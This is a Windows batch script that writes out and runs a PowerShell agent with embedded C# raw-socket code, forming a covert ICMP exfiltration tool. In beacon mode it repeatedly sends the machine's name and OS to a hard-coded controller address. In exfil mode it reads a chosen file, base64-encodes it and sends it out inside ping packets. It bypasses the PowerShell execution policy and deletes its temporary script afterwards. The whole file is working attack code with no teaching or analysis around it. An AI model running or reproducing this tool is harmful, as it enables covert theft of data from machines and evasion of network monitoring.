@echo off
set "CONTROLLER_IP=172.23.30.36"

:: Check if file argument is provided
if "%~1" neq "" (
    set "MODE=exfil"
    set "FILE=%~1"
) else (
    set "MODE=beacon"
)

:: Embed PowerShell script
set "PSFile=%TEMP%\ping_agent.ps1"
echo $ControllerIP = "%CONTROLLER_IP%" > "%PSFile%"
echo $Mode = "%MODE%" >> "%PSFile%"
echo $TargetFile = "%FILE%" >> "%PSFile%"

:: PowerShell Logic
(
echo $Magic = "EXFIL"
echo $BeaconInterval = 30
echo.
echo # C# Source for Raw Socket
echo $Source = @"
echo using System;
echo using System.Net;
echo using System.Net.Sockets;
echo using System.Runtime.InteropServices;
echo public class RawPing {
echo     public static void Send(string ip, byte[] payload) {
echo         Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
echo         IPEndPoint dest = new IPEndPoint(IPAddress.Parse(ip), 0);
echo         
echo         // Construct Packet (header + payload)
echo         // Simplified: Assume OS handles IP header, we build ICMP
echo         byte[] packet = new byte[8 + payload.Length];
echo         packet[0] = 8; // Type
echo         packet[1] = 0; // Code
echo         packet[2] = 0; // Checksum
echo         packet[3] = 0;
echo         packet[4] = 0; // ID
echo         packet[5] = 1;
echo         packet[6] = 0; // Seq
echo         packet[7] = 1;
echo         Array.Copy(payload, 0, packet, 8, payload.Length);
echo         
echo         // Checksum
echo         UInt16 checksum = CalculateChecksum(packet);
echo         packet[2] = (byte)(checksum ^& 0xFF);
echo         packet[3] = (byte)((checksum ^>^> 8) ^& 0xFF);
echo         
echo         sock.SendTo(packet, dest);
echo         sock.Close();
echo     }
echo     
echo     private static UInt16 CalculateChecksum(byte[] buffer) {
echo         int length = buffer.Length;
echo         int i = 0;
echo         UInt32 sum = 0;
echo         while (length ^> 1) {
echo             sum += BitConverter.ToUInt16(buffer, i);
echo             i += 2;
echo             length -= 2;
echo         }
echo         if (length ^> 0) sum += buffer[i];
echo         sum = (sum ^>^> 16) + (sum ^& 0xFFFF);
echo         sum += (sum ^>^> 16);
echo         return (UInt16)(~sum);
echo     }
echo }
echo "@
echo.
echo Add-Type -TypeDefinition $Source -Language CSharp
echo.
echo function Send-ExfilPacket {
echo     param([string]$Type, [string]$Data)
echo     $PayloadStr = $Magic + $Type + $Data
echo     $PayloadBytes = [System.Text.Encoding]::ASCII.GetBytes($PayloadStr)
echo     [RawPing]::Send($ControllerIP, $PayloadBytes)
echo }
echo.
echo if ($Mode -eq "beacon") {
echo     Write-Host "[*] Starting Beacon..."
echo     while ($true) {
echo         $Info = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($env:COMPUTERNAME + "|" + $env:OS)))
echo         Send-ExfilPacket "B" $Info
echo         Start-Sleep -Seconds $BeaconInterval
echo     }
echo }
echo elseif ($Mode -eq "exfil") {
echo     if (Test-Path $TargetFile) {
echo         Write-Host "[*] Exfiltrating $TargetFile..."
echo         $Bytes = [System.IO.File]::ReadAllBytes($TargetFile)
echo         $B64 = [Convert]::ToBase64String($Bytes)
echo         # Simple chunking logic could go here
echo         Send-ExfilPacket "D" ("0|1|1|" + (Split-Path $TargetFile -Leaf) + "|" + $B64)
echo         Write-Host "[+] Done"
echo     }
echo }
) >> "%PSFile%"

:: Run PowerShell
powershell -ExecutionPolicy Bypass -File "%PSFile%"

:: Cleanup
del "%PSFile%"
